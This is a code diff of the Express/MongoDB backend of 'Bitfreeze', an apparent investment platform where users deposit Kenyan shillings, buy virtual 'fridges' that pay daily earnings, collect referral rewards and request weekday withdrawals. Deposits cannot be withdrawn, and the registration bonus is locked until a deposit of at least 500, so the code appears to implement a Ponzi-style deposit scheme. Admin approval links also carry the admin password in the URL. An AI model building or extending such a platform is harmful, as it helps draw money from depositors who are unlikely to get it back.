@@ -43,29 +43,30 @@ const REFERRAL_RULES = [
   { min: 500, reward: 50 },
 ];
 
+// Middleware
 app.use(bodyParser.json());
 app.use(cors({ origin: DOMAIN }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ===================== MONGODB =====================
+// MongoDB
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log('MongoDB connected'))
   .catch(e => console.error('MongoDB connection error:', e));
 
-// ===================== SCHEMAS =====================
+// Schemas
 const userSchema = new mongoose.Schema({
   name: String,
   email: String,
   password: String,
   phone: String,
-  depositBalance: { type: Number, default: 0 }, // cannot withdraw
-  earningsBalance: { type: Number, default: 0 }, // can withdraw
+  depositBalance: { type: Number, default: 0 },
+  earningsBalance: { type: Number, default: 0 },
   fridges: { type: Array, default: [] },
   referrals: { type: Array, default: [] },
   referredBy: String,
-  createdAt: { type: Date, default: Date.now },
-  lastPaid: String,
   firstDepositMade: { type: Boolean, default: false },
+  lastPaid: String,
+  createdAt: { type: Date, default: Date.now }
 });
 
 const depositSchema = new mongoose.Schema({
@@ -93,7 +94,7 @@ const User = mongoose.model('User', userSchema);
 const Deposit = mongoose.model('Deposit', depositSchema);
 const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
 
-// ===================== HELPERS =====================
+// Helpers
 function auth(req, res, next) {
   const a = req.headers.authorization;
   if (!a || !a.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
@@ -109,29 +110,27 @@ async function tgSend(text, buttons) {
   }).catch(e => console.error('TG send error', e));
 }
 
-// ===================== ROUTES =====================
-
+// Routes
 // Register
 app.post('/api/register', async (req, res) => {
   const { name, email, password, referrerEmail } = req.body || {};
-  if (!name || !email || !password) return res.status(400).json({ error: 'Name, email, and password are required' });
+  if (!name || !email || !password) return res.status(400).json({ error: 'Name, email, and password required' });
 
   const hashed = await bcrypt.hash(password, 10);
   const ref = referrerEmail?.trim() || undefined;
 
-  const user = new User({ 
-    name, email, password: hashed, referredBy: ref,
+  const user = new User({
+    name,
+    email,
+    password: hashed,
+    referredBy: ref,
     earningsBalance: 200 // registration bonus goes to earnings
   });
-
   await user.save();
 
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({
-    message: 'Registered successfully. You got KES 200 bonus in earnings.',
-    token,
-    email: user.email
-  });
+
+  res.json({ message: 'Registered successfully. 200 KES reward added to earnings.', token, email: user.email });
 });
 
 // Login
@@ -142,7 +141,7 @@ app.post('/api/login', async (req, res) => {
   const ok = await bcrypt.compare(password, user.password);
   if (!ok) return res.status(400).json({ error: 'Invalid credentials' });
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({ token, email: user.email, phone: user.phone, depositBalance: user.depositBalance, earningsBalance: user.earningsBalance });
+  res.json({ token, email: user.email, phone: user.phone });
 });
 
 // Deposit
@@ -153,11 +152,12 @@ app.post('/api/deposit', auth, async (req, res) => {
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
 
-  const allowedAmounts = FRIDGES.map(f => f.price);
-  if (!allowedAmounts.includes(Number(amount))) return res.status(400).json({ error: `Deposit must be exact fridge amounts: ${allowedAmounts.join(', ')}` });
-
   const pending = await Deposit.findOne({ email: u.email, status: 'PENDING' });
   if (pending) return res.status(400).json({ error: 'You have a pending deposit' });
+
+  // Validate exact amounts according to fridges
+  const validAmounts = FRIDGES.map(f => f.price);
+  if (!validAmounts.includes(Number(amount))) return res.status(400).json({ error: 'Deposit amount must match a fridge price.' });
 
   const deposit = new Deposit({
     id: crypto.randomUUID(),
@@ -197,27 +197,21 @@ app.get('/api/admin/deposits/:id/:action', async (req, res) => {
   if (deposit.status === 'APPROVED') {
     const u = await User.findOne({ email: deposit.email });
     if (u) {
-      u.depositBalance += Number(deposit.amount);
-      if (!u.firstDepositMade) {
-        u.firstDepositMade = true;
-        await u.save();
+      u.depositBalance += deposit.amount;
+      if (!u.firstDepositMade && deposit.amount >= 500) u.firstDepositMade = true;
 
-        // Referral reward to referredBy
-        if (u.referredBy) {
-          const referrer = await User.findOne({ email: u.referredBy });
-          if (referrer) {
-            let reward = 0;
-            for (const rule of REFERRAL_RULES) {
-              if (deposit.amount >= rule.min) { reward = rule.reward; break; }
-            }
-            if (reward > 0) {
-              referrer.earningsBalance += reward;
-              referrer.referrals.push({ email: u.email, reward, date: new Date() });
-              await referrer.save();
-            }
+      // Referral reward
+      if (u.referredBy) {
+        const referrer = await User.findOne({ email: u.referredBy });
+        if (referrer) {
+          const rule = REFERRAL_RULES.find(r => deposit.amount >= r.min);
+          if (rule) {
+            referrer.earningsBalance += rule.reward;
+            await referrer.save();
           }
         }
       }
+
       await u.save();
     }
   }
@@ -230,13 +224,12 @@ app.post('/api/withdraw', auth, async (req, res) => {
   const { amount, phone } = req.body || {};
   if (!amount || !phone) return res.status(400).json({ error: 'amount & phone required' });
 
-  const today = new Date();
-  const day = today.getDay(); // 0=Sunday,6=Saturday
-  if (day === 0 || day === 6) return res.status(400).json({ error: 'Withdrawals allowed Monday to Friday only' });
-
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
 
+  const today = new Date().getDay(); // 0=Sun, 6=Sat
+  if (today === 0 || today === 6) return res.status(400).json({ error: 'Withdrawals allowed Monday to Friday only' });
+  if (!u.firstDepositMade) return res.status(400).json({ error: 'Cannot withdraw until first deposit ≥ 500' });
   if (u.earningsBalance < Number(amount)) return res.status(400).json({ error: 'Insufficient earnings balance' });
 
   const pending = await Withdrawal.findOne({ email: u.email, status: 'PENDING' });
@@ -252,7 +245,7 @@ app.post('/api/withdraw', auth, async (req, res) => {
   });
   await w.save();
 
-  const text = `🔵 <b>New Withdrawal Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nEarnings Balance: KES ${u.earningsBalance}\nWithdraw ID: ${w.id}\nStatus: PENDING`;
+  const text = `🔵 <b>New Withdrawal Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nWithdraw ID: ${w.id}\nStatus: PENDING`;
   const buttons = [[
     { text: '✅ Approve', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/approve?token=${ADMIN_PASS}` },
     { text: '❌ Reject', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/reject?token=${ADMIN_PASS}` }
@@ -262,7 +255,7 @@ app.post('/api/withdraw', auth, async (req, res) => {
   res.json({ message: 'Withdrawal submitted' });
 });
 
-// Approve withdraw
+// Approve withdrawal
 app.get('/api/admin/withdrawals/:id/:action', async (req, res) => {
   const { id, action } = req.params;
   const token = req.query.token;
@@ -287,7 +280,44 @@ app.get('/api/admin/withdrawals/:id/:action', async (req, res) => {
   res.send(`Withdrawal ${w.status}`);
 });
 
-// Daily earnings 12:00 AM Nairobi
+// Buy fridge
+app.post('/api/buy', auth, async (req, res) => {
+  const { fridgeId } = req.body || {};
+  const item = FRIDGES.find(f => f.id === fridgeId);
+  if (!item) return res.status(400).json({ error: 'Invalid fridge' });
+
+  const u = await User.findOne({ email: req.user.email });
+  if (!u) return res.status(404).json({ error: 'User not found' });
+  if (u.depositBalance < item.price) return res.status(400).json({ error: 'Insufficient deposit balance' });
+
+  u.depositBalance -= item.price;
+  u.fridges.push({ id: item.id, name: item.name, price: item.price, boughtAt: Date.now() });
+  await u.save();
+
+  res.json({ message: `Bought ${item.name}`, depositBalance: u.depositBalance });
+});
+
+// Get user profile with balances
+app.get('/api/me', auth, async (req, res) => {
+  const u = await User.findOne({ email: req.user.email });
+  if (!u) return res.status(404).json({ error: 'User not found' });
+
+  res.json({
+    user: {
+      email: u.email,
+      phone: u.phone,
+      fridges: u.fridges,
+      depositBalance: u.depositBalance,
+      earningsBalance: u.earningsBalance,
+      referralLink: DOMAIN + '/register.html?ref=' + encodeURIComponent(u.email)
+    }
+  });
+});
+
+// Fridge catalog
+app.get('/api/fridges', (req, res) => res.json({ fridges: FRIDGES }));
+
+// Daily earnings for fridges at 12 AM Nairobi
 async function runDailyEarnings() {
   const users = await User.find();
   const today = new Date().toLocaleDateString('en-GB', { timeZone: 'Africa/Nairobi' });
@@ -311,34 +341,7 @@ setInterval(async () => {
   const hours = now.toLocaleString('en-US', { hour12: false, hour: '2-digit', timeZone: 'Africa/Nairobi' });
   const minutes = now.toLocaleString('en-US', { minute: '2-digit', timeZone: 'Africa/Nairobi' });
   if (Number(hours) === 0 && Number(minutes) === 0) await runDailyEarnings();
-}, 5601000);
-
-// Fridges list
-app.get('/api/fridges', (req, res) => res.json({ fridges: FRIDGES }));
-
-// Buy fridge
-app.post('/api/buy', auth, async (req, res) => {
-  const { fridgeId } = req.body || {};
-  const item = FRIDGES.find(f => f.id === fridgeId);
-  if (!item) return res.status(400).json({ error: 'Invalid fridge' });
-  const u = await User.findOne({ email: req.user.email });
-  if (!u) return res.status(404).json({ error: 'User not found' });
-  if (u.depositBalance < item.price) return res.status(400).json({ error: 'Insufficient deposit balance' });
-  u.depositBalance -= item.price;
-  u.fridges.push({ id: item.id, name: item.name, price: item.price, boughtAt: Date.now() });
-  await u.save();
-  res.json({ message: `Bought ${item.name}`, depositBalance: u.depositBalance });
-});
-
-// Profile
-app.get('/api/me', auth, async (req, res) => {
-  const u = await User.findOne({ email: req.user.email });
-  if (!u) return res.status(404).json({ error: 'Not found' });
-  res.json({ user: u });
-});
-
-// Status
-app.get('/api/status', (req, res) => res.json({ status: 'ok', time: Date.now(), till: MPESA_TILL, name: MPESA_NAME }));
+}, 60000);
 
 // Start server
-app.listen(PORT, () => console.log(`Bitfreeze running on ${PORT}`));
+app.listen(PORT, () => console.log(`Bitfreeze running on port ${PORT}`));
